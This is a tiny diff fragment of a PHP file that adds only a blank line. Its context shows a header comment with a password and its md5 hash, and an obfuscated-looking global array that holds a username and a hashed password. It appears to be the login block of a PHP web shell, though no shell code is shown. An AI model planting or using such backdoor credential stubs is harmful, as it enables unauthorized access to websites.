@@ -7,6 +7,7 @@ PASS: kontol
 Original Pass: 52374961ca52754641654939a769f9db (md5)
 
 */
+
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => '0xNix',
     'password' => 'd489a3289ecdc847cb67f7a480e6f9fa',//md5(ehsan)
